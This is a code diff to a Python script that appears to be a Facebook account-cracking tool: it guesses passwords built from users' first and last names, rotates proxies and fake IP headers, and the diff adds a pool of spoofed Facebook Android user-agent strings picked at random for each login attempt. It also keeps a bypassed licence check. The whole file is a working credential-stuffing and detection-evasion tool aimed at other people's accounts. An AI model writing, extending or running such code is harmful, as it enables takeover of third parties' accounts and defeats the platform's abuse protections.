@@ -20,7 +20,7 @@ from io import BytesIO
 from concurrent.futures import ThreadPoolExecutor as tred
 from os import path
 
-#-----> Colors (Moved to top to prevent NameError) <-----#
+#-----> Colors <-----#
 LYLW, W, R, G, Y, B, P, S, O = '\033[93;1m', '\033[97;1m', '\033[91;1m', '\033[92;1m', '\033[93;1m', '\033[94;1m', '\033[95;1m', '\033[96;1m', '\x1b[38;5;246m'
 my_color = [P, W, G, S, B, Y, R, O]
 mrmafia = random.choice(my_color)
@@ -123,16 +123,32 @@ def fetch_proxies():
                 saved_proxies.append(proxy_url)
         return saved_proxies
     except Exception as e:
-        # إرجاع بروكسي فارغ أو بروكسيات افتراضية لتفادي إغلاق البرنامج عند فشل الاتصال بالبروكسي المعين
         return ["http://127.0.0.1:8080"]
 
 saved_proxies = fetch_proxies()
 
-#-----> method ua <-----#
-def f16():  
-    realme = random.choice(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071"])
-    url1 = '[FBAN/FB4A;FBAV/538.0.0.53.70;FBBV/819570880;FBDM/{density=1.4375,width=720,height=1473};FBLC/fr_FR;FBRV/0;FBCR/Ooredoo;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/'+realme+';FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
-    return url1
+#-----> COMBINED USER-AGENT METHOD <-----#
+def get_mafia_ua():
+    # Method 1
+    ua1 = '[FBAN/FB4A;FBAV/538.0.0.53.70;FBBV/819570880;FBDM/{density=1.4375,width=720,height=1473};FBLC/fr_FR;FBRV/0;FBCR/Ooredoo;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3611;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
+    
+    # Method 2
+    ua2_e = 'Dalvik/2.1.0(Linux; U; Android 4.2.2;Mate 20 Pro Build/HJ4ZZOFR)[FBAN/FB4A;FBAV/96.0.0.54.58FBBV/7954431FBDM/{density=3.0,width=545,height=1750}FBLC/de_DEFBRV/105921FBCR/TelecomFBMF/HuaweiFBBD/HuaweiFBPN/com.facebook.katanaFBDV/Mate 20 ProFBSV/4.2.2FBOP/1FBCA/arm64-v8a:]'
+    ua2_n = 'Dalvik/1.8.0(Linux; U; Android 6.0;Pixel 6 Pro Build/9PIIUCKN)[FBAN/FB4A;FBAV/87.0.0.77.29FBBV/6211050FBDM/{density=3.0,width=821,height=866}FBLC/fr_FRFBRV/9417169FBCR/OoredooFBMF/GoogleFBBD/GoogleFBPN/com.facebook.katanaFBDV/Pixel 6 ProFBSV/6.0FBOP/1FBCA/arm64-v8a:]'
+    
+    # Method 3
+    ua3_x = 'Dalvik/1.6.0(Linux; U; Android 6.0;SM-N975F Build/JVZVKPQK)[FBAN/FB4A;FBAV/110.0.0.33.44FBBV/1048880FBDM/{density=3.0,width=786,height=1542}FBLC/en_USFBRV/6857455FBCR/TelecomFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-N975FFBSV/6.0FBOP/1FBCA/arm64-v8a:]'
+    ua3_c = 'Dalvik/1.8.0(Linux; U; Android 5.0;V2027 Build/9UN42ODV)[FBAN/FB4A;FBAV/83.0.0.66.18FBBV/2922198FBDM/{density=3.0,width=929,height=935}FBLC/pt_BRFBRV/7373113FBCR/VodafoneFBMF/VivoFBBD/VivoFBPN/com.facebook.katanaFBDV/V2027FBSV/5.0FBOP/1FBCA/arm64-v8a:]'
+    ua3_v = 'Dalvik/1.6.0(Linux; U; Android 8.0;LM-Q710 Build/6F8D7018)[FBAN/FB4A;FBAV/105.0.0.2.61FBBV/2851716FBDM/{density=3.0,width=1070,height=1240}FBLC/pt_BRFBRV/3513389FBCR/VodafoneFBMF/LGFBBD/LGFBPN/com.facebook.katanaFBDV/LM-Q710FBSV/8.0FBOP/1FBCA/arm64-v8a:]'
+    
+    # Method 4 (تم تصحيح علامات الاقتباس هنا)
+    ua4_m = 'Dalvik/1.6.0(Linux; U; Android 12.0;Pixel 5a Build/UN7W8B39)[FBAN/FB4A;FBAV/112.0.0.93.73FBBV/8286488FBDM/{density=3.0,width=821,height=1482}FBLC/pt_BRFBRV/5777103FBCR/OoredooFBMF/GoogleFBBD/GoogleFBPN/com.facebook.katanaFBDV/Pixel 5aFBSV/12.0FBOP/1FBCA/arm64-v8a:]'
+    ua4_r = 'Dalvik/1.6.0(Linux; U; Android 10.0;Moto G Play Build/HPL6RXO5)[FBAN/FB4A;FBAV/116.0.0.30.11FBBV/30250FBDM/{density=3.0,width=973,height=1290}FBLC/es_ESFBRV/7370772FBCR/OrangeFBMF/MotorolaFBBD/MotorolaFBPN/com.facebook.katanaFBDV/Moto G PlayFBSV/10.0FBOP/1FBCA/arm64-v8a:]'
+    ua4_p = 'Dalvik/2.1.0(Linux; U; Android 12.0;Redmi Note 9 Pro Build/43ZLJ4M4)[FBAN/FB4A;FBAV/96.0.0.95.74FBBV/8130169FBDM/{density=3.0,width=791,height=749}FBLC/es_ESFBRV/892025FBCR/VodafoneFBMF/XiaomiFBBD/XiaomiFBPN/com.facebook.katanaFBDV/Redmi Note 9 ProFBSV/12.0FBOP/1FBCA/arm64-v8a:]'
+    ua4_t = 'Dalvik/2.1.0(Linux; U; Android 5.0;CPH2099 Build/5MU70AGV)[FBAN/FB4A;FBAV/86.0.0.65.73FBBV/6513365FBDM/{density=3.0,width=1027,height=1800}FBLC/pt_BRFBRV/1922778FBCR/VodafoneFBMF/OPPOFBBD/OPPOFBPN/com.facebook.katanaFBDV/CPH2099FBSV/5.0FBOP/1FBCA/arm64-v8a:]'
+    
+    all_uas = [ua1, ua2_e, ua2_n, ua3_x, ua3_c, ua3_v, ua4_m, ua4_r, ua4_p, ua4_t]
+    return random.choice(all_uas)
 
 #-----> ip fakeee Method + system random locale + system mask Data <-----#    
 def IPV4_FAKEEEE():  
@@ -162,7 +178,10 @@ def Maf_1(ids, names, passlist):
             
         for pw in passlist:
             pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-            mafia_Ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/393.0.0.15.50;FBBV/825857276;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBRV/443011581;FBCR/Etisalat;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/X693;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
+            
+            # جلب ميثود الـ User Agent المدمج الجديد عشوائياً لكل محاولة طلب
+            mafia_Ua = get_mafia_ua()
+            
             proxy_u = random.choice(saved_proxies).strip()
             proxies = {'http': f'{proxy_u}', 'https': f'{proxy_u}'}
             random_ip = IPV4_FAKEEEE()
@@ -204,7 +223,6 @@ def check_approval():
     except:user = "user"
     key = "MAFIA-" + str(os.geteuid()) + user.replace('u0_a', '')
     
-    # تحويل نظام التحقق إلى محاكي تخطي لتشغيل السكريبت مباشرة
     print(f" [✔] Your Key: {key}")
     print(f" [✔] Status: APPROVED BY SYSTEM")
     time.sleep(1)
